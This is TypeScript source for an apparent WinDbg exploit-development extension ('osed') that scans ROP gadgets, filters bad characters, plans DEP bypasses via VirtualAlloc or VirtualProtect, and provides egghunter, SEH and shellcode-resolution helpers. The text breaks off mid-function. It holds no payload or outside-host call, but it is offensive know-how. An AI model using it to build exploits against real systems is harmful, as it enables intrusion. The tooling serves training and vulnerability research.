/*
Shellcode helper usage:
dx @$osed().sc.peb()
dx @$osed().sc.modules()
dx @$osed().sc.module_pages("kernel32")
dx @$osed().sc.page_summary("kernel32")
dx @$osed().sc.base("kernel")
dx @$osed().sc.pe("kernel32")
dx @$osed().sc.exports("kernel32")
dx @$osed().sc.resolve("kernel32","WinExec")
dx @$osed().sc.hashes("kernel32")
dx @$osed().sc.hashes("kernel32","crc32")
dx @$osed().sc.hash("WinExec","ROR13")
dx @$osed().sc.hashresolve("kernel32",0x7c0dfcaa)
dx @$osed().sc.algorithms()
dx @$osed().sc.exportdir("kernel32")
dx @$osed().sc.export("kernel32","GetProcAddress")
dx @$osed().sc.exportat("kernel32",842)
dx @$osed().sc.exportwalk("kernel32","GetProcAddress")
dx @$osed().sc.exportwalk("kernel32","GetProcAddress",true)
dx @$osed().sc.iat()
dx @$osed().sc.iat("app.exe")
dx @$osed().sc.iat_find("VirtualAlloc")
dx @$osed().sc.iat_ptr("app.exe","VirtualAlloc")
*/

import { Command, CommandRegistry, CommandResult } from "./core/registry";
import { createPatternCommands } from "./commands/pattern";
import { createBadcharsCommand, createBadcharArrayCommand, createBadcharFindCommand, createBadcharFunctionCommand } from "./commands/badchars";
import { createEgghunterCommand } from "./commands/egghunter";
import { createSehCommand } from "./commands/seh";
import { createModulesCommand } from "./commands/modules";
import { createRopCommands } from "./commands/rop";
import { createPivotCommand } from "./commands/pivot";
import { createHelpCommand } from "./commands/help";
import { createReloadCommand } from "./commands/reload";
import { createSehPprCommand } from "./commands/seh_ppr";
import { createExploitCommand } from "./commands/exploit";
import { createTriageCommand, readRegisters } from "./commands/triage";
import { createFindMspCommand } from "./commands/findmsp";
import { createFindPtrCommand } from "./commands/find_ptr";
import { createEncodeCommand } from "./commands/encode";
import { createNopCommand } from "./commands/nop";
import { createRopTemplateCommand } from "./commands/rop_template";
import type { RopGadget } from "./rop/types";
import type { DepApi } from "./commands/rop_template";
import { findEncodings } from "./core/backward_scanner";
import { badcharAddressFilter } from "./logic/pointer_filter_logic";
import { COPY_SEPARATOR, CORPUS_BLOCK, HELPER_BLOCK, buildExploit, measureLanding, slotBlock, type Block, type Delta } from "./commands/dep_build";
import { GROUPS as PALETTE_GROUPS, SHAPES as PALETTE_SHAPES, extrasOf as paletteExtras, paletteLines, pickShape, shapeEncodings } from "./commands/palette";
import { CONSTANTS, DEP_PLAN_APIS, DEP_PLAN_SECTIONS, DEP_PLAN_STYLES, NX_POLICIES, NX_POLICY_ADDRESS, depPlanArgs, depState, encodingsFor, gadgetAddress as depPlanAddress, hex32 as dwordHex, jobsFor, met, planJobs, planLines, planSkeleton, settledLines, type DepPlanStyle, type Job, type JobPlan, type Settled, type WriteTrial } from "./commands/dep_plan";
import { type FrameFacts } from "./commands/dep_frames";
import { createDepFunctionCommand } from "./commands/dep_function";
import { createScBuilderCommand, createScCallFrameCommand, createScPushStringCommand, createScTemplateCommand, splitBadToken } from "./commands/sc_writer";
import { addressBadBytes, createCodeCavesCommand, findCodeCaves } from "./commands/code_caves";
import { createFmtCommands } from "./commands/fmtstr";
import { createShellcodeNamespace } from "./shellcode";
import { createExplainCommand, wrapApi, type ExplainState } from "./explain/explain";
import { buildBestApiResolution, buildCapabilities, buildCapabilityIndexFromRpPlusText, buildCapabilityIndexFromSequences, classifyPivotSource, dwordIsByteSafe, emissionRows, exportCorpus, filterCorpusByBadchars, firstKnownAddress, fixRetImmPadding, formatChainPython, formatExportPython, gadgetSequence, hex32, importCorpus, mergeCapabilityIndexes, normalizeExploitStrategy, planExploitStrategy, planRegisterSetup, planVirtualAlloc, planVirtualAllocFrame, planVirtualProtect, planVirtualProtectFrame, planWriteProcessMemory, planWriteProcessMemoryFrame, planRegisterSetupPacking, planWriteFrame, planSlotDispatch, validateCorpus, type CorpusFingerprint, type ImportedCorpus, type FrameWord, type SlotDispatchPlan, RankedSemanticEmitter, solveValue, strategyPlanRows, summarizeCapabilities, synthesize, synthesisRows, type ApiResolutionMode, type CapabilityIndex, type ChainTarget, type ControlMechanism, type EmissionResult, type ExploitState, type ExportableEmission, type ExportableSynthesis, type FlatFramePlan, type RegisterState, type RopQuery, type RopStrategyPlan, type SynthesisResult, type ValueRecipe, type VirtualAllocFrameParams, type VirtualAllocParams, type VirtualProtectFrameParams, type VirtualProtectParams, type WriteProcessMemoryFrameParams, type WriteProcessMemoryParams } from "./rop";
import { buildExploitFrame } from "./rop/exploit_frame";
import { verifyChain, parseManualChain, type VerificationReport } from "./rop/chain_verifier";
import { discoverLiveGadgets, type LiveDiscoveryOptions } from "./analysis/live_gadgets";
import { badcharSlotArgs } from "./analysis/badchar_scan";
import { findModuleByAddress, listModulesWithMitigations } from "./commands/modules";
import { sequencesFromLiveHits } from "./semantics/live-provider";
import { RPPlusProviderOptions } from "./semantics/rpplus-provider";
import { formatAddress } from "./core/output";
import * as out from "./core/output";
import { DxResult, toDxResult } from "./core/dx_result";
import { executeDebuggerCommand, getPointerSize, tryReadMemory } from "./core/memory";
import { findHelpEntry, helpRows } from "./core/help_catalog";
import { createMemoryCommand } from "./commands/memory";
import { createLandingCommand, landingDxRows } from "./commands/landing";
import { createMathCommand } from "./commands/math";
import { createVersionCommand } from "./commands/version";
import { getVersionInfo } from "./core/version";
import { createStringCommands } from "./commands/strings";
import { createFindStackBytesCommand } from "./commands/find_stack_bytes";
import { createFindMemBytesCommand } from "./commands/find_mem_bytes";
import { createStackmapCommand } from "./commands/stackmap";
import { createLeakCommands } from "./commands/leak";
import type { SerializedLandingEvidence } from "./analysis/landing";
import { ProofController, ProofSessionStore, WinDbgProofAdapter, type ProofPlanInput } from "./rop/proof";
import { formatCorpusReport, type CorpusReportModule, type CorpusReportOrigin, type CorpusReportValidation } from "./rop/corpus_report";

declare const self: Record<string, unknown> | undefined;

type OsedApi = {
  [name: string]: unknown;
};

const registry = new CommandRegistry();
let osed: OsedApi = {};
let lastResult: CommandResult | undefined;
let currentRopCorpus: CapabilityIndex | undefined;
let pendingImportedCorpus: ImportedCorpus | undefined;
let corpusOrigin: CorpusReportOrigin = "rpplus";
let corpusValidation: CorpusReportValidation = "unknown";
let corpusBadchars: number[] | undefined;
/** The live scan behind the corpus ran to the end of every module, so it holds every gadget there is. */
let corpusComplete = false;
let corpusGeneration = 0;
let nextRopPlanId = 1;
const ropPlans = new Map<number, { plan: RopStrategyPlan; generation: number }>();
interface CorpusModuleEntry {
  name: string;
  accepted: number;
  rejected: number;
  usable: boolean;
  reason?: string;
  /** Module base at scan time; used to detect a rebase (relaunch) that invalidates gadget addresses. */
  base?: bigint;
  aslr?: "enabled" | "disabled" | "unknown";
}
let corpusModules: CorpusModuleEntry[] = [];
const ropEmitter = new RankedSemanticEmitter();
let cachedExploitState: ExploitState | undefined;
let proofSessionStore = new ProofSessionStore();
let lastGeneratedProofInput: ProofPlanInput | undefined;
const NO_ROP_CORPUS_MESSAGE = "No active ROP corpus. Run rop.scan(...) or rop.scan_live(...), or validate an imported corpus with rop.corpus.validate().";
const NO_EXPLOIT_STATE_MESSAGE = "No exploit state available. Run triage() first to capture crash state.";

function buildExploitStateFromTriage(findings: Record<string, unknown>): ExploitState {
  const control = findings.control as Record<string, unknown> | undefined;
  const stack = findings.stack as Record<string, unknown> | undefined;
  const seh = findings.seh as Record<string, unknown> | undefined;
  const badcharStats = findings.badchars as Array<{ byte: number; count: number }> | undefined;

  const ipControlled = control?.ipControlled === true;

  let mechanism: ControlMechanism = "saved-ret";
  if (seh?.overwritten === "yes") {
    mechanism = "seh";
  }

  const badchars = (badcharStats ?? [])
    .filter((entry) => typeof entry.byte === "number")
    .map((entry) => entry.byte & 0xff);

  const sp = stack?.sp;
  const spValue = sp !== undefined && sp !== null ? Number(sp) : undefined;

  const landing = stack?.landing as Record<string, unknown> | undefined;
  const landingBytes = landing?.bytes as number[] | undefined;
  const controlledAfterEsp = landingBytes?.length ?? 0;

  const registers: Partial<Record<string, RegisterState>> = {};
  const regEntries = (control as Record<string, unknown>)?.registers as Array<{ name: string; value: unknown }> | undefined;
  if (Array.isArray(regEntries)) {
    for (const entry of regEntries) {
      const name = entry.name?.toLowerCase();
      if (name && name !== "eip" && name !== "esp") {
        registers[name] = { kind: "unknown" };
      }
    }
  }

  return {
    control: {
      mechanism,
      instructionPointerControlled: ipControlled,
    },
    stack: {
      espAtControl: spValue,
      controlledBeforeEsp: 0,
      controlledAfterEsp,
      contiguousControlledBytes: controlledAfterEsp,
      readable: true,
      writable: true,
      executable: typeof (stack as Record<string, unknown>)?.stackExecutable === "boolean" ? (stack as Record<string, unknown>).stackExecutable as boolean : false,
    },
    registers,
    constraints: {
      badchars,
      apiResolution: "either",
    },
  };
}

function mergeExploitStateOverrides(base: ExploitState, overrides: Record<string, unknown>): ExploitState {
  const merged = { ...base };

  if (overrides.mechanism !== undefined) {
    merged.control = { ...merged.control, mechanism: String(overrides.mechanism) as ControlMechanism };
  }
  if (overrides.eipControlled !== undefined) {
    merged.control = { ...merged.control, instructionPointerControlled: Boolean(overrides.eipControlled) };
  }

  if (overrides.controlledBytesAfterEsp !== undefined) {
    merged.stack = { ...merged.stack, controlledAfterEsp: Number(overrides.controlledBytesAfterEsp), contiguousControlledBytes: Number(overrides.controlledBytesAfterEsp) };
  }
  if (overrides.controlledBytesBeforeEsp !== undefined) {
    merged.stack = { ...merged.stack, controlledBeforeEsp: Number(overrides.controlledBytesBeforeEsp) };
  }
  if (overrides.stackWritable !== undefined) {
    merged.stack = { ...merged.stack, writable: Boolean(overrides.stackWritable) };
  }
  if (overrides.stackExecutable !== undefined) {
    merged.stack = { ...merged.stack, executable: Boolean(overrides.stackExecutable) };
  }

  if (overrides.badchars !== undefined) {
    merged.constraints = { ...merged.constraints, badchars: parseHexByteList(overrides.badchars) as number[] };
  }
  if (overrides.apiResolution !== undefined) {
    const resolution = String(overrides.apiResolution).toLowerCase();
    if (resolution === "direct" || resolution === "iat" || resolution === "either") {
      merged.constraints = { ...merged.constraints, apiResolution: resolution };
    }
  }
  if (overrides.maximumPayloadLength !== undefined) {
    merged.constraints = { ...merged.constraints, maximumPayloadLength: Number(overrides.maximumPayloadLength) };
  }

  return merged;
}

function diagnoseModuleBadchars(moduleName: string, badchars: number[]): string | undefined {
  try {
    const modules = listModulesWithMitigations(moduleName);
    const mod = modules.find((m) => m.name.toLowerCase().includes(moduleName.toLowerCase()));
    if (!mod) return undefined;
    const badSet = new Set(badchars);
    const base = mod.base;
    const baseBytes: number[] = [];
    const pointerSize = getPointerSize();
    for (let i = 0; i < pointerSize; i++) {
      baseBytes.push(Number((base >> BigInt(i * 8)) & BigInt(0xff)));
    }
    const offending = baseBytes
      .map((b, i) => ({ byte: b, position: i }))
      .filter((entry) => badSet.has(entry.byte));
    if (offending.length === 0) return undefined;
    const baseHex = `0x${base.toString(16).toUpperCase().padStart(pointerSize * 2, "0")}`;
    const packed = baseBytes.map((b) => b.toString(16).toUpperCase().padStart(2, "0")).join(" ");
    const byByte = new Map<number, number[]>();
    for (const entry of offending) {
      const list = byByte.get(entry.byte) ?? [];
      list.push(entry.position);
      byByte.set(entry.byte, list);
    }
    const badSummary = [...byByte.entries()]
      .map(([byte, positions]) => {
        const hex = `0x${byte.toString(16).toUpperCase().padStart(2, "0")}`;
        const posStr = positions.length === 1
          ? `offset ${positions[0]}`
          : positions.length === positions[positions.length - 1] - positions[0] + 1
            ? `offsets ${positions[0]}-${positions[positions.length - 1]}`
            : `offsets ${positions.join(",")}`;
        return `${hex} (${posStr})`;
      })
      .join(", ");
    return `${mod.name} base ${baseHex} | packed: ${packed} | bad bytes: ${badSummary}. No usable gadget addresses.`;
  } catch {
    return undefined;
  }
}

function invalidateCorpusPlans(): void {
  corpusGeneration++;
  ropPlans.clear();
  nextRopPlanId = 1;
}

function resetCorpusModules(): void {
  corpusModules = [];
}

function corpusReportModules(): CorpusReportModule[] {
  return corpusModules.map((module) => ({
    name: module.name,
    base: module.base,
    aslr: module.aslr ?? "unknown",
  }));
}

// Current live base of a module by name, or undefined for the "<all>" scan or
// an unresolved name. Used to capture scan-time bases and detect rebases.
function moduleInfoByName(name: string) {
  if (!name || name === "<all>") return undefined;
  const matches = listModulesWithMitigations(name);
  return matches.find((m) => m.name.toLowerCase() === name.toLowerCase()) ?? matches[0];
}

function moduleBaseByName(name: string): bigint | undefined {
  return moduleInfoByName(name)?.base;
}

// Predicate that returns false for addresses inside a module currently loaded
// off its preferred base (relocated → its address will differ next run), so
// gadget selection can prefer reliable, preferred-base modules. Enumerates the
// live module list once per build.
function buildStableAddressPredicate(): (address: bigint) => boolean {
  const relocated: Array<[bigint, bigint]> = [];
  for (const mod of listModulesWithMitigations()) {
    if (mod.preferredBase !== undefined && mod.preferredBase !== BigInt(0) && mod.base !== mod.preferredBase) {
      relocated.push([mod.base, mod.base + mod.size]);
    }
  }
  return (address: bigint) => !relocated.some(([lo, hi]) => address >= lo && address < hi);
}

// Modules whose current base differs from the base recorded when they were
// scanned — their gadget addresses in the corpus are stale and must not be used.
function corpusStaleModules(): Array<{ name: string; was: bigint; now: bigint | undefined }> {
  const tracked = corpusModules.filter((entry) => entry.base !== undefined);
  if (tracked.length === 0) return [];
  // Enumerate the live module list once. The tracked name is the (possibly short)
  // filter the user passed to scan_live, while the live module.Name is often a
  // full path — match the same substring way moduleBaseByName captured the base.
  const live = listModulesWithMitigations();
  const stale: Array<{ name: string; was: bigint; now: bigint | undefined }> = [];
  for (const entry of tracked) {
    const needle = entry.name.toLowerCase();
    const match = live.find((m) => m.name.toLowerCase() === needle)
      ?? live.find((m) => m.name.toLowerCase().includes(needle) || m.path.toLowerCase().includes(needle));
    const now = match?.base;
    if (now === undefined || now !== entry.base!) {
      stale.push({ name: entry.name, was: entry.base!, now });
    }
  }
  return stale;
}

function getGlobalObject(): Record<string, unknown> | undefined {
  if (typeof globalThis !== "undefined") {
    return globalThis as unknown as Record<string, unknown>;
  }
  if (typeof self !== "undefined") {
    return self as unknown as Record<string, unknown>;
  }
  return undefined;
}

function publishOsed(): void {
  const globalObject = getGlobalObject();
  if (globalObject) {
    globalObject.osed = osed;
  }
}

function writeProofText(path: string, content: string): void {
  const hostAny = host as unknown as {
    namespace?: { Debugger?: { Utility?: { FileSystem?: { CreateFile?: (path: string, disposition: string) => unknown } } } };
  };
  const raw = hostAny.namespace?.Debugger?.Utility?.FileSystem?.CreateFile?.(path, "CreateAlways");
  if (!raw) throw new Error("WinDbg host filesystem is unavailable.");
  const file = raw as { WriteBytes?: (bytes: Iterable<number>) => void; Close?: () => void };
  if (typeof file.WriteBytes !== "function") throw new Error("WinDbg host file does not support WriteBytes.");
  try {
    // WinDbg File objects are byte streams.  Do not assume a TextWriter is
    // available on every JS provider version.
    const bytes: number[] = [];
    for (let index = 0; index < content.length; index += 1) {
      let code = content.charCodeAt(index);
      if (code >= 0xd800 && code <= 0xdbff && index + 1 < content.length) {
        const low = content.charCodeAt(index + 1);
        if (low >= 0xdc00 && low <= 0xdfff) {
          code = 0x10000 + ((code - 0xd800) << 10) + (low - 0xdc00);
          index += 1;
        }
      }
      if (code <= 0x7f) bytes.push(code);
      else if (code <= 0x7ff) bytes.push(0xc0 | (code >> 6), 0x80 | (code & 0x3f));
      else if (code <= 0xffff) bytes.push(0xe0 | (code >> 12), 0x80 | ((code >> 6) & 0x3f), 0x80 | (code & 0x3f));
      else bytes.push(0xf0 | (code >> 18), 0x80 | ((code >> 12) & 0x3f), 0x80 | ((code >> 6) & 0x3f), 0x80 | (code & 0x3f));
    }
    file.WriteBytes(bytes);
  } finally {
    file.Close?.();
  }
}

function utf8ByteLength(content: string): number {
  let length = 0;
  for (let index = 0; index < content.length; index += 1) {
    const code = content.charCodeAt(index);
    if (code <= 0x7f) length += 1;
    else if (code <= 0x7ff) length += 2;
    else if (code >= 0xd800 && code <= 0xdbff && index + 1 < content.length
      && content.charCodeAt(index + 1) >= 0xdc00 && content.charCodeAt(index + 1) <= 0xdfff) {
      length += 4;
      index += 1;
    } else length += 3;
  }
  return length;
}

function readText(path: string): string {
  const hostAny = host as unknown as { namespace?: { Debugger?: { Utility?: { FileSystem?: { OpenFile?: (path: string) => unknown; CreateFile?: (path: string, disposition: string) => unknown } } } } };
  const fs = hostAny.namespace?.Debugger?.Utility?.FileSystem;
  const raw = fs?.OpenFile?.(path) ?? fs?.CreateFile?.(path, "OpenExisting");
  const file = raw as { ReadBytes?: (count: number) => unknown; Close?: () => void } | undefined;
  if (!file || typeof file.ReadBytes !== "function") throw new Error("WinDbg host filesystem read support is unavailable.");
  try {
    const bytes: number[] = [];
    for (;;) {
      const chunk = Array.from(file.ReadBytes(64 * 1024) as Iterable<unknown>, Number);
      if (chunk.length === 0) break;
      bytes.push(...chunk);
      if (chunk.length < 64 * 1024) break;
    }
    return String.fromCharCode(...bytes);
  } finally {
    file.Close?.();
  }
}

function fingerprintCorpus(index: CapabilityIndex): CorpusFingerprint {
  const modules = new Map<string, CorpusFingerprint["modules"][number]>();
  const samples: CorpusFingerprint["samples"] = [];
  const seen = new Set<number>();
  for (const gadget of index.gadgets) {
    for (const location of gadget.locations) {
      if (location.virtualAddress === undefined || seen.has(location.virtualAddress) || samples.length >= 128) continue;
      seen.add(location.virtualAddress);
      const address = BigInt(location.virtualAddress);
      const module = findModuleByAddress(address);
      if (!module) continue;
      const bytes = tryReadMemory(address, Math.min(16, Math.max(1, gadget.instructions.length * 4)));
      if (!bytes) continue;
      modules.set(`${module.name}\u0000${module.path}`, { name: module.name, path: module.path, base: Number(module.base), size: Number(module.size) });
      samples.push({ address: location.virtualAddress, bytes: [...bytes] });
    }
  }
  return { modules: [...modules.values()], samples };
}

function registerAll(): void {
  const commands: Command[] = [
    ...createPatternCommands(),
    createBadcharsCommand(),
    createBadcharArrayCommand(),
    createBadcharFunctionCommand(),
    createBadcharFindCommand(),
    createEgghunterCommand(),
    createSehCommand(),
    createModulesCommand(),
    ...createRopCommands(),
    createPivotCommand(),
    createSehPprCommand(),
    createTriageCommand(),
    createFindMspCommand(),
    createFindPtrCommand(),
    createMemoryCommand(),
    createFindMemBytesCommand(),
    createFindStackBytesCommand(),
    createLandingCommand(),
    createStackmapCommand(),
    ...createLeakCommands(),
    createMathCommand(),
    createVersionCommand(),
    ...createStringCommands(),
    createCodeCavesCommand(),
    createEncodeCommand(),
    createNopCommand(),
    createRopTemplateCommand(),
    createDepFunctionCommand(),
    createScPushStringCommand(),
    createScCallFrameCommand(),
    createScTemplateCommand(),
    createScBuilderCommand(),
    ...createFmtCommands(),
    createExploitCommand(),
    createHelpCommand(registry),
    createReloadCommand(registry),
  ];

  for (const command of commands) {
    registry.register(command);
  }
}

function bindApi(): OsedApi {
  const api: OsedApi = {};
  const sc = createShellcodeNamespace();
  const invoke = (commandName: string, args: unknown[]) => {
    if (args.length === 1 && args[0] === "help") {
      const result = registry.execute("help", { command: commandName });
      lastResult = result;
      return result.success;
    }
    const result = registry.execute(commandName, normalizeInvocation(commandName, args));
    lastResult = result;
    if (commandName === "triage" && result.success && result.findings.length > 0) {
      cachedExploitState = buildExploitStateFromTriage(result.findings[0] as Record<string, unknown>);
    }
    if (!result.success) {
      for (const error of result.errors) {
        out.error(error);
      }
      const command = registry.get(commandName);
      if (command) {
        out.info(`Usage: ${command.usage}`);
      }
    }
    return result.success;
  };
  const setResult = (result: CommandResult): void => {
    lastResult = result;
  };

  const renderRows = (title: string, rows: Array<Record<string, string>>): void => {
    if (rows.length === 0) {
      return;
    }
    out.section(title);
    if (rows.length > 0 && "Error" in rows[0]) {
      out.error(rows[0].Error);
      return;
    }
    const keys = [...new Set(rows.flatMap((row) => Object.keys(row)))];
    out.table(keys.map((key) => ({ key, header: key })), rows);
  };

  const formatSet = (values: Set<unknown>): string => {
    return [...values].map((value) => String(value)).join(", ");
  };

  const formatSemanticField = (field: { confidence: string; values: { exact: Set<unknown>; conservative: Set<unknown>; unknown: boolean } }): string => {
    if (field.values.unknown) {
      return "unknown";
    }

    const parts: string[] = [];
    if (field.values.exact.size > 0) {
      parts.push(`exact=${formatSet(field.values.exact)}`);
    }
    if (field.values.conservative.size > 0) {
      parts.push(`conservative=${formatSet(field.values.conservative)}`);
    }
    return parts.length > 0 ? `${field.confidence.toLowerCase()}(${parts.join("; ")})` : "none";
  };

  const gadgetStackDisplay = (gadget: CapabilityIndex["gadgets"][number]): string => {
    if (gadget.categories.includes("STACK_PIVOT")) return "DYN";
    const field = gadget.semanticSummary.summary.stackDelta;
    if (field.values.unknown || field.values.conservative.size > 0 || field.values.exact.size !== 1) return "?";
    const value = [...field.values.exact][0];
    return value > 0 ? `+${value}` : String(value);
  };

  const primaryCapability = (gadget: CapabilityIndex["gadgets"][number]): string => {
    if (gadget.categories.includes("STACK_PIVOT")) return "STACK_PIVOT";
    return gadget.capabilities.find((capability) => capability.kind === "MEMORY_WRITE")?.kind
      ?? gadget.capabilities[0]?.kind
      ?? "?";
  };

  const queryRows = (query: RopQuery, verbose = false): Array<Record<string, string>> => {
    if (!currentRopCorpus) {
      return [{ Error: NO_ROP_CORPUS_MESSAGE }];
    }

    const gadgets = currentRopCorpus.query(query);
    const pointerSize = getPointerSize();
    return gadgets.map((gadget) => {
      const location = gadget.locations[0];
      const compact = {
        Address: location?.virtualAddress !== undefined ? formatAddress(BigInt(location.virtualAddress), pointerSize) : "n/a",
        Sequence: gadget.instructions.map((instruction) => instruction.normalizedText || instruction.originalText).join(" ; "),
        Capability: primaryCapability(gadget),
        Stack: gadgetStackDisplay(gadget),
        Score: gadget.score.toString(),
      };
      if (!verbose) return compact;
      return {
        ...compact,
        Module: location?.module ?? "n/a",
        Terminator: [...gadget.semanticSummary.summary.flowEffects.values.exact].join(", ") || "none",
        Reads: formatSemanticField(gadget.semanticSummary.summary.reads),
        Writes: formatSemanticField(gadget.semanticSummary.summary.writes),
        MemoryReads: formatSemanticField(gadget.semanticSummary.summary.memoryReads),
        MemoryWrites: formatSemanticField(gadget.semanticSummary.summary.memoryWrites),
        StackDelta: formatSemanticField(gadget.semanticSummary.summary.stackDelta),
        Capabilities: gadget.capabilities.map((capability) => capability.kind).join(", "),
      };
    });
  };

  const capabilityRows = (): Array<Record<string, string>> => {
    if (!currentRopCorpus) {
      return [{ Error: NO_ROP_CORPUS_MESSAGE }];
    }
    return summarizeCapabilities(currentRopCorpus);
  };

  const helperHelp = (name: string): DxResult => {
    const entry = findHelpEntry(name);
    const rows = entry ? helpRows(entry) : [{ Error: `Unknown helper '${name}'.` }];
    renderRows(`Help: ${name}`, rows);
    setResult({
      command: "help",
      args: { command: name },
      success: entry !== undefined,
      findings: rows,
      warnings: [],
      errors: entry ? [] : [`Unknown helper '${name}'.`],
    });
    return toDxResult(`Help: ${name}`, rows);
  };

  // Refuse to emit gadgets when a scanned module has rebased since scan time —
  // its addresses now point at the wrong memory. Returns an error DxResult to
  // return early, or undefined when the corpus is still valid.
  const staleCorpusGuard = (title: string, command: string): DxResult | undefined => {
    const stale = corpusStaleModules();
    if (stale.length === 0) return undefined;
    const detail = stale
      .map((s) => `${s.name} ${hex32(s.was)} -> ${s.now !== undefined ? hex32(s.now) : "not loaded"}`)
      .join("; ");
    const message = `Corpus is STALE — module(s) rebased since scan: ${detail}. These non-ASLR modules relocated (e.g. after a target relaunch), so the corpus's gadget addresses now point at the wrong memory. Re-run rop.scan_live(...) for them before building a chain.`;
    const rows = [{ Error: message }];
    renderRows(title, rows);
    setResult({ command, args: {}, success: false, findings: [], warnings: [], errors: [message] });
    return toDxResult(title, rows);
  };

  const scanCorpus = (text: string, options: RPPlusProviderOptions = {}, badchars?: number[]): DxResult => {
    pendingImportedCorpus = undefined;
    corpusOrigin = "rpplus";
    corpusComplete = false;
    corpusValidation = "unknown";
    corpusBadchars = badchars ? [...badchars] : [];
    invalidateCorpusPlans();
    resetCorpusModules();
    const raw = buildCapabilityIndexFromRpPlusText(text, options);
    const warnings: string[] = [];
    let filteredCount = 0;
    if (badchars && badchars.length > 0) {
      const { filtered, removedCount } = filterCorpusByBadchars(raw, badchars);
      filteredCount = removedCount;
      currentRopCorpus = filtered;
      if (removedCount > 0) {
        const byteList = badchars.map((b) => `0x${(b & 0xff).toString(16).toUpperCase().padStart(2, "0")}`).join(" ");
        warnings.push(`${removedCount} gadget(s) filtered — address contains badchar(s): ${byteList}`);
      }
    } else {
      currentRopCorpus = raw;
    }
    const rows = summarizeCapabilities(currentRopCorpus);
    out.section("ROP Corpus Loaded");
    out.info(`Gadgets: ${currentRopCorpus.gadgets.length}`);
    if (filteredCount > 0) out.info(`Filtered: ${filteredCount} (badchar address)`);
    out.info(`Capabilities: ${rows.length}`);
    for (const w of warnings) out.warn(w);
    setResult({
      command: "rop.scan",
      args: { text, ...options },
      success: true,
      findings: [{ gadgets: currentRopCorpus.gadgets.length, capabilities: rows.length, filtered: filteredCount }],
      warnings,
      errors: [],
    });
    return toDxResult("ROP Corpus Loaded", [
      { Corpus: "loaded", Gadgets: currentRopCorpus.gadgets.length.toString(), Filtered: filteredCount.toString(), Capabilities: rows.length.toString() },
    ]);
  };

  const discoverLiveIndexes = (modules: Array<string | undefined>, options: Omit<LiveDiscoveryOptions, "module">) => {
    const discoveries = modules.map((module) => discoverLiveGadgets({ ...options, module }));
    return { discoveries, indexes: discoveries.map((discovery) => buildCapabilityIndexFromSequences(sequencesFromLiveHits(discovery.hits))) };
  };

  const scanLiveCorpus = (
    modules: Array<string | undefined>,
    options: Omit<LiveDiscoveryOptions, "module">,
    append: boolean,
  ): DxResult => {
    pendingImportedCorpus = undefined;
    corpusOrigin = "live";
    corpusValidation = "sampled";
    corpusBadchars = Array.isArray(options.badchars) ? [...options.badchars] : [];
    const { discoveries, indexes: discoveredIndexes } = discoverLiveIndexes(modules, options);
    invalidateCorpusPlans();
    if (!append) resetCorpusModules();
    const indexes = append && currentRopCorpus
      ? [currentRopCorpus, ...discoveredIndexes]
      : discoveredIndexes;
    currentRopCorpus = mergeCapabilityIndexes(indexes);
    const capRows = summarizeCapabilities(currentRopCorpus);
    const stats = discoveries.reduce(
      (total, discovery) => ({
        patterns: total.patterns + discovery.stats.patterns,
        scanned: total.scanned + discovery.stats.scanned,
        discovered: total.discovered + discovery.stats.discovered,
        rejected: total.rejected + discovery.stats.rejected,
        backwardTerminators: total.backwardTerminators + (discovery.stats.backwardTerminators ?? 0),
        backwardDispatch: total.backwardDispatch + (discovery.stats.backwardDispatch ?? 0),
        backwardNonSequentialRejected: total.backwardNonSequentialRejected + (discovery.stats.backwardNonSequentialRejected ?? 0),
        backwardGadgets: total.backwardGadgets + (discovery.stats.backwardGadgets ?? 0),
        backwardRawCandidates: total.backwardRawCandidates + (discovery.stats.backwardRawCandidates ?? 0),
        backwardFiltered: total.backwardFiltered + (discovery.stats.backwardFiltered ?? 0),
        backwardLimit: total.backwardLimit + (discovery.stats.backwardLimit ?? 0),
        backwardComplete: Math.min(total.backwardComplete, discovery.stats.backwardComplete ?? 1),
      }),
      { patterns: 0, scanned: 0, discovered: 0, rejected: 0, backwardTerminators: 0, backwardDispatch: 0, backwardNonSequentialRejected: 0, backwardGadgets: 0, backwardRawCandidates: 0, backwardFiltered: 0, backwardLimit: 0, backwardComplete: 1 },
    );
    corpusComplete = !append && stats.backwardComplete === 1;
    const warnings = discoveries.flatMap((discovery) => discovery.warnings);
    const badcharsArray = Array.isArray(options.badchars) ? options.badchars : [];
    for (let i = 0; i < modules.length; i++) {
      const mod = modules[i];
      const disc = discoveries[i];
      const accepted = disc.stats.discovered;
      const rejected = disc.stats.rejected;
      let reason: string | undefined;
      if (mod && disc.stats.scanned > 0 && accepted === 0 && badcharsArray.length > 0) {
        reason = diagnoseModuleBadchars(mod, badcharsArray);
        if (reason) warnings.push(reason);
      }
      const modName = mod ?? "<all>";
      const moduleInfo = moduleInfoByName(modName);
      const base = moduleInfo?.base;
      const existing = corpusModules.find((m) => m.name === modName);
      if (existing) {
        existing.accepted = accepted;
        existing.rejected = rejected;
        existing.usable = accepted > 0;
        existing.reason = reason;
        existing.base = base;
        existing.aslr = moduleInfo?.aslr;
      } else {
        corpusModules.push({
          name: modName,
          accepted,
          rejected,
          usable: accepted > 0,
          reason,
          base,
          aslr: moduleInfo?.aslr,
        });
      }
    }

    out.section("Module Scan");
    for (let i = 0; i < modules.length; i++) {
      const mod = modules[i] ?? "<all>";
      const disc = discoveries[i];
      const accepted = disc.stats.discovered;
      const rejected = disc.stats.rejected;
      out.info(`${mod}: ${accepted} raw gadgets accepted, ${rejected} rejected`);
    }

    out.section("Corpus Summary");
    out.info(`Mode: ${append ? "append" : "replace"}`);
    out.info(`Modules: ${corpusModules.map((m) => m.name).join(", ")}`);
    out.info(`Semantic gadgets: ${currentRopCorpus.gadgets.length} (deduplicated)`);
    out.info(`Capabilities: ${capRows.length}`);
    if (stats.backwardTerminators > 0) {
      out.info(`Backward scan: ${stats.backwardTerminators} RET terminators | ${stats.backwardDispatch} dispatch candidates | ${stats.backwardRawCandidates}/${stats.backwardLimit} raw candidates | ${stats.backwardGadgets} accepted | ${stats.backwardFiltered} filtered | ${stats.backwardNonSequentialRejected} non-sequential RET paths excluded | complete: ${stats.backwardComplete === 1 ? "yes" : "no (candidate limit reached)"}`);
    }

    for (const warning of warnings) {
      out.warn(warning);
    }

    setResult({
      command: "rop.scan_live",
      args: { modules, append, ...options },
      success: true,
      findings: [{ modules: corpusModules.length, gadgets: currentRopCorpus.gadgets.length, capabilities: capRows.length, ...stats }],
      warnings,
      errors: [],
    });
    const uniqueModuleNames = corpusModules.map((m) => m.name).join(", ");
    return toDxResult("Live ROP Corpus", [
      ...modules.map((mod, i) => {
        const disc = discoveries[i];
        return {
          Section: "Module Scan",
          Module: mod ?? "<all>",
